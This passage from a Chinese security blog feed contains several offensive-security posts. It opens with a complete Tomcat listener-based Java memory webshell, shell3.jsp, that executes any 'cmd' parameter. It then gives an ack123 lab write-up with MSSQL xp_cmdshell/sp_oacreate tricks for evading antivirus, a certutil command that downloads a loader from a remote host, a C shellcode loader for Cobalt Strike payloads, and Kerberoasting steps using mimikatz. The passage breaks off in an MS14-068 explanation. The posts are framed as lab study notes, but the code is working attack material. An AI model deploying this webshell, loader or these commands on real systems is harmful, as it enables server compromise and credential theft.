class="operator">=</span> servletRequest.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestF.get(servletRequest);</span><br><span class="line">request.getResponse()<span class="comment">//拿到response</span></span><br></pre></td></tr></table></figure><p>故构造的恶意Mylistener.class如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.listener;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mylistener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> sre.getServletRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd!=<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> servletRequest.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestF.get(servletRequest);</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> request.getResponse().getWriter();</span><br><span class="line">                out.println(output);</span><br><span class="line">                out.flush();</span><br><span class="line">                out.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                System.out.println(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="image-20230507215709948.png" alt="image-20230507215709948"></p><p>同样找到<code>org.apache.catalina.startup.ContextConfig#configureContext</code>中和listener有关的部分如下</p><p><img src="image-20230507221045922.png" alt="image-20230507221045922"></p><p>在这里打个断点debug一下就会发现listener并没有被放到context中</p><p><img src="image-20230507220835337.png" alt="image-20230507220835337"></p><p>实际上这里对于注册ServletRequestListener不是通过<code>addApplicationListener</code>方法而是<code>addApplicationEventListener</code>方法</p><p><img src="image-20230507221901142.png" alt="image-20230507221901142"></p><p>所以直接调用<code>addApplicationEventListener</code>就可以了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">standardContext.addApplicationEventListener(<span class="keyword">new</span> <span class="title class_">Shelllistener</span>());</span><br></pre></td></tr></table></figure><p>所以完整的shell3.jsp为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shelllistener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd!=<span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                    in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> servletRequest.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestF.get(servletRequest);</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> request.getResponse().getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    System.out.println(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//拿到standardContext</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span>  (ApplicationContext) applicationField.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span>  (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    standardContext.addApplicationEventListener(<span class="keyword">new</span> <span class="title class_">Shelllistener</span>());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>先访问/shell3.jsp再带入参数cmd就可以执行任意命令了</p><p><img src="image-20230507223323123.png" alt="image-20230507223323123"></p><p>参考：</p><p>​<a href="https://ha1c9on.top/?p=1949">Java  Memory Shell &amp; Tomcat</a></p><p>​<a href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w">JSP Webshell那些事 – 攻击篇(下)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;介绍&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;Java内存马（Java Memory Shell）&lt;/code&gt;是一种利用Java虚拟机（JVM）中的内存对象和反射技术来执行恶意代码的攻击手段。&lt;/p&gt;
&lt;p&gt;与传统木马相比，Java内存马具有以下几个优势：&lt;/p&gt;
</summary>
      
    
    
    
    <category term="JAVA" scheme="http://example.com/categories/JAVA/"/>
    
    
    <category term="内存马" scheme="http://example.com/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>暗月ack靶场学习记录</title>
    <link href="http://example.com/post/%E6%9A%97%E6%9C%88ack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://example.com/post/%E6%9A%97%E6%9C%88ack%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2023-04-30T02:32:53.000Z</published>
    <updated>2023-06-14T11:51:01.742Z</updated>
    
    <content type="html"><![CDATA[<p>最近打了一套新的靶场——暗月ack,学到了很多新东西,特此记录</p><h1 id="烂土豆（RottenPotato）">烂土豆（RottenPotato）</h1><p><code>烂土豆（Rotten Potato） MS16-075</code> 是一种利用 Windows 客户端操作系统中 NT AUTHORITY\SYSTEM 权限漏洞的攻击方法,可以实现本地提权,对应的补丁号为<code>KB3164038</code></p><p>适用版本：<code>Windows 7、8、10、2008、2012</code></p><p>当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时,Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞。成功利用此漏洞的攻击者可以使用提升的特权执行任意代码</p><p>若要利用此漏洞,攻击者首先必须登录系统。然后,攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序,从而控制受影响的系统,可见,该漏洞的利用方式还是比较简单的</p><p>首先在拥有一个登录用户的情况下输入<code>whoami /prive</code>查看当前用户的权限</p><p>如果发现有<code>SeAssignPrimaryTokenPrivilege</code>权限或者<code>SeImpersonatePrivilege</code> 权限并且系统未打对应的补丁则可以成功利用烂土豆提权</p><h1 id="MSSQL拿shell">MSSQL拿shell</h1><p>拿到sql server的<code>sa账户</code>以后可以通过<code>xp_cmdshell</code>来执行系统命令</p><p>先判断xp_shell是否存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;X&#x27; and name=&#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure><p>如果显示0则可以通过以下命令重新加载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;);</span><br></pre></td></tr></table></figure><p>执行命令方法为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;whoami&#x27;;</span><br></pre></td></tr></table></figure><p>在命令执行之后下一步的目标就是拿shell,这里采用的方法是利用windows自带的<code>certutil</code>下载shellcode加载器</p><p>但是使用xp_cmdshell去调用certutil会发现被火绒拦截了,所以我们需要使用<code>sp_oacreate</code>来执行命令</p><blockquote><p><code>xp_cmdshell</code> 和 <code>sp_oacreate</code> 都是 SQL Server 中用于执行操作系统命令的工具,但是它们之间存在一些差异</p><p><code>xp_cmdshell</code> 是在 SQL Server 上直接调用 Windows 的 <code>cmd.exe</code> 执行指定的命令,因此容易被杀毒软件和防火墙拦截。当执行 <code>xp_cmdshell</code> 命令时,如果杀毒软件或防火墙检测到其中包含有潜在的安全威胁,则可能会立即阻止该命令的执行</p><p>相比之下,<code>sp_oacreate</code> 是使用 SQL Server 的 COM (组件对象模型) 接口创建一个外部对象,并通过该对象调用操作系统命令,因此在某种程度上可以绕过杀毒软件或防火墙的检测。但是,由于它需要使用 COM 对象,而且需要启用 <code>Ole Automation Procedures</code> 选项才能使用,因此在某些情况下可能不太方便使用</p></blockquote><p><code>sp_oacreate</code>可以删除、复制、移动文件,还能配合<code>sp_oamethod</code>来写文件执行<code>cmd</code>,但是<code>sp_oamethod</code>无回显</p><p>首先要开启<code>sp_oacreate</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;,1;</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure><p>将 certutil.exe 复制到 C:\Windows\Temp\ 下,并重命名为 sethc.exe</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @o int; exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\Windows\System32\certutil.exe&#x27; ,&#x27;c:\windows\temp\sethc.exe&#x27;;</span><br></pre></td></tr></table></figure><p>生成cobalt strike 的shellcode加载器</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [binary string]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) / <span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* buf = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">sscanf</span>(&amp;argv[<span class="number">1</span>][i * <span class="number">2</span>], <span class="string">&quot;%2hhx&quot;</span>, &amp;buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//申请内存（权限为rwx）</span></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="number">1024</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="comment">//将shellcode复制进申请的内存中</span></span><br><span class="line">    <span class="built_in">RtlMoveMemory</span>(exec, buf, <span class="number">1024</span>);</span><br><span class="line">    <span class="comment">//执行shellcode</span></span><br><span class="line">    ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用Visual Studio编译生成load.exe</p><p>certutil 工具远程下载 loader.exe</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\sethc.exe -urlcache -split -f &quot;http://192.168.59.1/loader.exe&quot; C:\Windows\Temp\loader.exe&#x27;</span><br></pre></td></tr></table></figure><p>xp_cmdshell 执行命令加载 shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;C:\Windows\Temp\loader.exe shellcode二进制木马‘</span><br></pre></td></tr></table></figure><h1 id="kerberosting">kerberosting</h1><p><code>Kerberoast </code>是一种针对 Kerberos 身份验证协议的攻击技术,用于从域控制器获取受保护的服务账户（Service Account）密码哈希值并进行破解</p><p>流程如下：</p><p><img src="image-20230430190501680.png" alt="image-20230430190501680"></p><p>攻击者拿到ST用于本地离线爆破,如果字典足够强大则可以爆破出SPN链接用户的明文密码</p><p>这个过程中,客户端在请求ST的时候是可以<code>协商所使用的加密算法</code>,只有使用的是<code>RC4加密</code>才有可能被爆破出来</p><blockquote><p>kerberosting一般只攻击注册下用户下的SPN,而机器账户的密码是随机生成的128位字符,不太可能爆破出来</p></blockquote><p>首先查询某个域中的SPN信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T ack123.com -q */*</span><br></pre></td></tr></table></figure><blockquote><ul><li>setspn：setspn 是一个 Windows 命令行工具,用于管理和操作 Active Directory 中的 SPN 信息</li><li>-T <a href="http://ack123.com">ack123.com</a>：指定要查询的域或计算机名称,例如 <a href="http://ack123.com">ack123.com</a> 表示查询该域中的 SPN 信息</li><li>-q：指定要执行的操作类型,这里表示查询 SPN 信息。</li><li><em>/</em>：指定要查询的所有 SPN 类型和名称,包括服务类别和实例名称。其中 * 表示通配符,表示任意字符或字符串</li></ul></blockquote><p>SPN命令格式:<code>SPN = serviceclass &quot;/&quot; hostname [&quot;:&quot;port] [&quot;/&quot; servicename]</code></p><p>在web2中可以看到Administrator注册了一个mysql的SPN</p><p><img src="image-20230430191030997.png" alt="image-20230430191030997"></p><p>接下来使用mimikatz请求SPN的ST</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com</span><br></pre></td></tr></table></figure><p>导出当前票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure><p>利用kerberoast.exe爆破即可成功获取Administrator的密码明文</p><p>参考：</p><p><a href="https://www.cnblogs.com/wkzb/p/15667624.html">渗透测试带防御的内网域（ack123靶场）</a></p><p><a href="https://blog.csdn.net/qq_38850916/article/details/124801004">内网渗透、三层拓扑、红队考核靶场(ack123)</a></p><p><a href="https://zhuanlan.zhihu.com/p/422937627">CS-Shellcode分析（一）</a></p><p><a href="https://blog.csdn.net/u014029795/article/details/116910134">SQL Server提权总结与记录-xp_cmdshell/sp_oacreate/sandbox提权</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近打了一套新的靶场——暗月ack,学到了很多新东西,特此记录&lt;/p&gt;
&lt;h1 id=&quot;烂土豆（RottenPotato）&quot;&gt;烂土豆（RottenPotato）&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;烂土豆（Rotten Potato） MS16-075&lt;/code&gt; 是一种利用 W</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="靶场" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之ms14_068和黄金、白银票据</title>
    <link href="http://example.com/post/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bms14-068%E5%92%8C%E9%BB%84%E9%87%91%E3%80%81%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/"/>
    <id>http://example.com/post/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bms14-068%E5%92%8C%E9%BB%84%E9%87%91%E3%80%81%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</id>
    <published>2023-04-14T05:30:26.000Z</published>
    <updated>2023-06-14T11:53:42.833Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MS14-068">MS14-068</h1><p>MS14-068 是微软在 2014 年 11 月发布的一个安全公告,其中提到了 Windows 操作系统中存在的一个漏洞,对应的补丁号是<code>KB3011780</code>.该漏洞被称为 Kerberos Checksum Vulnerability,允许攻击者通过伪造 Kerberos 协议包来获取域控制器的权限,从而可能导致整个 Active Directory 域受到攻击.</p><p>该漏洞影响 Windows Server 2003、Windows Vista、Windows Server 2008、Windows 7 和 Windows Server 2008 R2 等多个版本的 Windows 操作系统,并被评定为危急级别.</p><h2 id="原理">原理</h2><p>在学习这个漏洞之前我们要先明白kerberos协议的认证流程：</p><p><img src="https://img2018.cnblogs.com/blog/1222663/201910/1222663-20191029184606216-1725954036.png" alt=""></p><p>在kerberos最初的设计流程中只说明了如何证明客户端的真实身份,并没有说明客户端是否有权限访问这个服务,为了解决这个问题,微软引入了<code>PAC（Privilege Attribute Certificate）</code>用来辨明用户的身份和权限.</p><p>PAC 包含了<code>用户身份信息（包括用户的用户名、域名、SID（Security Identifier）等）</code>、<code>授权信息（包括用户所属的组别以及每个组别对应的 SID 和权限,用于判断用户是否具有相应的访问权限）</code>、<code>签名信息（用于验证 PAC 的完整性和真实性,防止篡改和伪造攻击）</code>和其他辅助信息,</p><p>在 Kerberos 认证中,PAC数字签名包含两部分：<code>PAC 签名</code>和<code>票据签名</code>.</p><ol><li><p>PAC 签名：用于验证 PAC 中携带的用户安全属性信息是否被篡改或伪造.在<code>生成 TGT</code> 时,KDC（Key Distribution Center）会使用其<code>krbtgt服务账户的密码哈希</code>对 PAC 进行数字签名,并将签名结果添加到 TGT 中.在后续的服务请求中,TGS（Ticket Granting Service）会获取 PAC,并利用 KDC 的公钥来验证 PAC 签名的真实性.</p></li><li><p>票据签名：用于验证票据是否被篡改或伪造.在<code>生成 TGS 票据</code>时,TGS 使用<code>服务账户的密码哈希</code>对票据进行数字签名,并将签名结果添加到 TGS 标志中.在服务端接收到客户端请求时,会提取 TGS 票据中的票据签名,并利用服务账户的公钥来验证票据的真实性.</p></li></ol><p>作为一名低权限用户,如果我们想要访问高权限用户才能访问的服务,我们只需要获取到<code>高权限用户的TGT</code>就可以了,而通过MS14-068这个漏洞我们就可以获取到高权限用户的TGT</p><p>原理：</p><p>客户端在发起认证请求时,通过设置<code>include-PAC</code>为<code>False</code>,则返回TGT中不会包含PAC</p><p><img src="image-20230416151131851.png" alt="image-20230416151131851"></p><p>此时我们可以构造一个新的PAC,这个PAC里的User SID 和 Group SID都是<code>高权限用户的User SID 和 Group SID</code>而PAC尾部的签名则是使用将前面的data（User SID &amp; Group 